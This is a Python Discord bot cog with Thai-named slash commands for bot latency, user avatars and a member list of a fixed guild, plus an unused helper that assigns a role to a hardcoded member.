import discord
from discord.ext import commands
from typing import Union , Any
class Utility(commands.Cog):
    def __init__(self, bot : commands.AutoShardedBot, *args, **kwargs):
        self.bot = bot
        super().__init__(*args , **kwargs)
    
    @commands.Cog.listener()
    async def on_ready(self):
        print(self.__class__.__name__)
        
    @discord.commands.slash_command(name = "ความหน่วงของบอท" , description = "เช็คความหน่วงของบอท")
    async def latency(self , ctx : discord.ApplicationContext):
        embed = discord.Embed(title = "ความหน่วง [Ping]" , description = f"```{round(self.bot.latency * 1000)} ms```" , color = discord.Colour.green())
        embed.set_footer(text = f"Requested by {ctx.interaction.user}" , icon_url = ctx.interaction.user.avatar.url)
        await ctx.respond(embed=embed)
    
    async def send_stats(self , ctx : discord.ApplicationContext):
        guild = self.bot.get_guild(982294501295001672)
        mem = []
        for i in guild.members:
            mem.append(str(i))
        await ctx.respond(content = f"**Member Count** : [{len(guild.members)}]\n**Member List** : \n```{', '.join(mem)}```")
    
    async def setup_server(self , ctx : discord.ApplicationContext):
        member = ctx.guild.get_member(982291384155381810)
        role = discord.utils.get(ctx.guild.roles, name="GM20XTU85")
        await member.add_roles(role)
        await role.edit(colour=0xFFFF00)

    async def send_avatar(self, ctx : discord.ApplicationContext, member : Union[discord.Member, discord.User] = None) -> Any:
        if member is None:
            member = ctx.author
        await ctx.respond(content = member.display_avatar)
        
    @discord.commands.slash_command(name = "เช็คสถิติของเซิร์ฟเวอร์" , description = "แสดงผลสถิติของเซิร์ฟเวอร์")
    async def serverstats(self, ctx: discord.ApplicationContext):
        return await self.send_stats(ctx)
    
    @discord.commands.slash_command(name = "อวาตาร์", description = "แสดงผลอวาตาร์ของคุณ")
    async def avatar(self, ctx : discord.ApplicationContext, member : discord.commands.Option(Union[discord.User, discord.Member],name = "member", description = "เลือก member ที่ต้องการ", required = False)):
        return await self.send_avatar(ctx, member)
    
def setup(bot : commands.AutoShardedBot):
    bot.add_cog(Utility(bot))

